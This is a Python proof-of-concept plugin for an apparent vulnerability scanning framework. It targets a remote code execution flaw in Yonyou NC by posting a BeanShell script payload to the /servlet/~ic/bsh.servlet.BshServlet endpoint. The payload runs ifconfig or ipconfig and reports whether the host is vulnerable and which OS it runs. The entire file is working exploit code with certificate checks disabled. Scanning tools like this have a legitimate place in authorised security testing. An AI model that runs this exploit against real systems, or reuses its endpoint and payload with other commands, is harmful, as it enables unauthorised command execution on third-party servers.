import pocs
import urllib.request
import ssl
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='用友nc远程代码执行漏洞'
        self.vul_name='用友nc远程代码执行漏洞'
        self.vul_num=''
        self.app_name='用友nc'
        self.app_version=''
        self.author='haochen'
        self.msg=''
        self.must_parameter={
            'target' : ''
        }

    def exploit(self, must_parameter, choo_parameter):
        att_msg = {}
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        head = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length':'79',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
        }
        data1= {
            "bsh.script":'exec("ipconfig")',
            "bsh.servlet.captureOutErr":'true',
            "bsh.servlet.output":"raw"
        }
        data2={
            "bsh.script":'exec("ifconfig")',
            "bsh.servlet.captureOutErr":'true',
            "bsh.servlet.output":"raw"        
        }
        self.payload =  "/servlet/~ic/bsh.servlet.BshServlet"
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.post(target,headers=head,verify=False,data=data2)
            if response.status_code==200 and 'IP' in response.text:
                # 攻击完成后需要将攻击的结果写入
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在用友远程代码执行漏洞，且系统为linux'
            else:
                response = requests.post(target,headers=head,verify=False,data=data1)
                if response.status_code==200 and 'IP' in response.text:
                    # 攻击完成后需要将攻击的结果写入
                    att_msg['status'] = 'success'
                    att_msg['msg'] = '存在用友远程代码执行漏洞，且系统为windows'
                else:
                    att_msg['status']='failed'
                    att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                    #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg



